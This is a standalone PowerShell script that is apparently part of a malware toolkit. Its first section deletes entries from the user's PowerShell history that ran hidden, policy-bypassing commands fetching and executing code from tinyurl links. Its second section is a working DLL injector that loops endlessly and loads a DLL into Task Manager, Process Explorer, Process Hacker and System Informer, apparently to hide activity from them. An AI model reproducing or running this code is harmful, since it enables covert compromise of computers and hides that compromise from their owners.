# -------------------------------
# 1) Clean PowerShell history
# -------------------------------

$historyFile = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt"

$blockedCommands = @(
    'powershell -windowstyle hidden -ep bypass -c "irm https://tinyurl.com/CursedCoreHidden | iex"',
    'powershell -windowstyle hidden -ep bypass -c "irm https://tinyurl.com/cursedcorehack | iex"'
)

if (Test-Path $historyFile) {
    $history = Get-Content $historyFile

    $filtered = $history | Where-Object {
        $keep = $true
        foreach ($cmd in $blockedCommands) {
            if ($_ -like "*$cmd*") {
                $keep = $false
                break
            }
        }
        return $keep
    }

    Set-Content $historyFile -Value $filtered -Encoding UTF8
    Write-Host "[+] PowerShell history cleaned." -ForegroundColor Green
} else {
    Write-Host "[-] History file not found at $historyFile" -ForegroundColor Yellow
}

# -------------------------------
# 2) DLL Injector Loop
# -------------------------------

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class Win32 {
    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,
        uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
        byte[] lpBuffer, int nSize, out int lpNumberOfBytesWritten);

    [DllImport("kernel32.dll")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32.dll")]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess,
        IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress,
        IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    public const uint PROCESS_ALL_ACCESS = 0x1F0FFF;
    public const uint MEM_COMMIT = 0x1000;
    public const uint MEM_RESERVE = 0x2000;
    public const uint PAGE_READWRITE = 0x04;
}
"@ -Language CSharpVersion3

# Target processes to inject into
$targetProcesses = @(
    "ProcessHacker",
    "SystemInformer",
    "procexp",
    "taskmgr"
)


$dllPath = "C:\Windows\System32\Apon.dll"
$alreadyInjected = @{}

while ($true) {
    foreach ($name in $targetProcesses) {
        $procList = Get-Process -Name $name -ErrorAction SilentlyContinue

        foreach ($proc in $procList) {
            if ($alreadyInjected.ContainsKey($proc.Id)) {
                continue
            }

            Write-Host "[+] Found $name (PID $($proc.Id)) - Injecting..."

            $hProcess = [Win32]::OpenProcess([Win32]::PROCESS_ALL_ACCESS, $false, $proc.Id)
            if ($hProcess -eq [IntPtr]::Zero) {
                Write-Host "[-] Cannot open process $name PID $($proc.Id)"
                continue
            }

            $dllBytes = [System.Text.Encoding]::ASCII.GetBytes($dllPath + [char]0)
            $alloc = [Win32]::VirtualAllocEx($hProcess, [IntPtr]::Zero, $dllBytes.Length,
                [Win32]::MEM_COMMIT -bor [Win32]::MEM_RESERVE, [Win32]::PAGE_READWRITE)

            if ($alloc -eq [IntPtr]::Zero) {
                Write-Host "[-] Memory allocation failed."
                continue
            }

            $written = 0
            [Win32]::WriteProcessMemory($hProcess, $alloc, $dllBytes, $dllBytes.Length, [ref]$written) | Out-Null

            $loadLib = [Win32]::GetProcAddress([Win32]::GetModuleHandle("kernel32.dll"), "LoadLibraryA")
            if ($loadLib -eq [IntPtr]::Zero) {
                Write-Host "[-] Could not find LoadLibraryA."
                continue
            }

            $thread = [Win32]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $loadLib, $alloc, 0, [IntPtr]::Zero)
            if ($thread -ne [IntPtr]::Zero) {
                Write-Host "[+] Injected into PID $($proc.Id)"
                $alreadyInjected[$proc.Id] = $true
            } else {
                Write-Host "[-] Thread creation failed."
            }
        }
    }

    # Cleanup dead PIDs from injected list
    $runningPIDs = Get-Process | Select-Object -ExpandProperty Id
    $alreadyInjected.Keys | ForEach-Object {
        if ($_ -notin $runningPIDs) {
            $alreadyInjected.Remove($_)
        }
    }

    Start-Sleep -Seconds 2
}
